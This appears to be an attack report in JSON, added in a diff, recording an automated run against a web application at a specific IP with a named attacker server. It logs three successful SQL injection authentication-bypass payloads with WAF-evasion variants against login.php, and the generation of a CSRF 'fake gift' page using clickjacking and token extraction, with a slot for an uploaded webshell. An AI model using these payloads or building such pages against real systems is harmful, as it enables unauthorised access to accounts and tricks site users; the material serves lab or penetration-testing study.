@@ -1,0 +1,135 @@
+{
+  "metadata": {
+    "target": "http://15.164.95.252",
+    "attacker_server": "http://13.158.67.78:5000",
+    "start_time": "2025-11-06 12:03:49",
+    "end_time": "2025-11-06 12:05:52",
+    "duration_seconds": 122,
+    "attacker_user_id": "1",
+    "tool_version": "1.0"
+  },
+  "summary": {
+    "total_vulnerabilities": 3,
+    "critical_count": 3,
+    "high_count": 0,
+    "vulnerability_breakdown": {
+      "sql_injection": 3,
+      "file_upload": 0,
+      "lfi": 0,
+      "xss": 0,
+      "csrf": 0
+    }
+  },
+  "vulnerabilities": {
+    "sql_injection": [
+      {
+        "url": "http://15.164.95.252/login.php",
+        "username": "admin",
+        "password": "'\tor\t'1'LIKE'1",
+        "description": "Password field injection",
+        "impact": "CRITICAL - Authentication bypass with WAF evasion",
+        "cvss_score": 9.8,
+        "waf_bypass_technique": "Password field injection"
+      },
+      {
+        "url": "http://15.164.95.252/login.php",
+        "username": "admin",
+        "password": "\"+Or+1LIKE1+--",
+        "description": "Case variation",
+        "impact": "CRITICAL - Authentication bypass with WAF evasion",
+        "cvss_score": 9.8,
+        "waf_bypass_technique": "Case variation"
+      },
+      {
+        "url": "http://15.164.95.252/login.php",
+        "username": "admin",
+        "password": "\"+oR+\"1\"LIKE\"1\"+--",
+        "description": "Mixed case",
+        "impact": "CRITICAL - Authentication bypass with WAF evasion",
+        "cvss_score": 9.8,
+        "waf_bypass_technique": "Mixed case"
+      }
+    ],
+    "xss": [],
+    "csrf": [],
+    "lfi": [],
+    "file_upload": []
+  },
+  "attack_timeline": [
+    {
+      "timestamp": "2025-11-06 12:03:49",
+      "type": "SCAN_START",
+      "description": "Advanced security assessment started on http://15.164.95.252",
+      "severity": "INFO",
+      "details": {}
+    },
+    {
+      "timestamp": "2025-11-06 12:04:00",
+      "type": "SQL_INJECTION_ADVANCED",
+      "description": "Successfully bypassed authentication using advanced SQL injection: Password field injection",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password='\tor\t'1'LIKE'1",
+        "method": "Password field injection",
+        "account": "admin",
+        "points": 0,
+        "waf_bypass": true
+      }
+    },
+    {
+      "timestamp": "2025-11-06 12:04:01",
+      "type": "SQL_INJECTION_ADVANCED",
+      "description": "Successfully bypassed authentication using advanced SQL injection: Case variation",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=\"+Or+1LIKE1+--",
+        "method": "Case variation",
+        "account": "admin",
+        "points": 0,
+        "waf_bypass": true
+      }
+    },
+    {
+      "timestamp": "2025-11-06 12:04:03",
+      "type": "SQL_INJECTION_ADVANCED",
+      "description": "Successfully bypassed authentication using advanced SQL injection: Mixed case",
+      "severity": "CRITICAL",
+      "details": {
+        "payload": "username=admin, password=\"+oR+\"1\"LIKE\"1\"+--",
+        "method": "Mixed case",
+        "account": "admin",
+        "points": 0,
+        "waf_bypass": true
+      }
+    },
+    {
+      "timestamp": "2025-11-06 12:05:52",
+      "type": "SETUP",
+      "description": "Generated advanced CSRF attack page with multiple bypass techniques",
+      "severity": "INFO",
+      "details": {
+        "filename": "advanced-fake-gift.html",
+        "techniques": [
+          "token_extraction",
+          "clickjacking",
+          "form_csrf",
+          "xhr_csrf",
+          "get_csrf",
+          "websocket_csrf"
+        ],
+        "attacker_id": "1"
+      }
+    },
+    {
+      "timestamp": "2025-11-06 12:05:52",
+      "type": "SCAN_COMPLETE",
+      "description": "Advanced assessment completed. 3 vulnerabilities found",
+      "severity": "INFO",
+      "details": {}
+    }
+  ],
+  "artifacts": {
+    "uploaded_webshell": null,
+    "fake_gift_page": "advanced-fake-gift.html"
+  }
+}
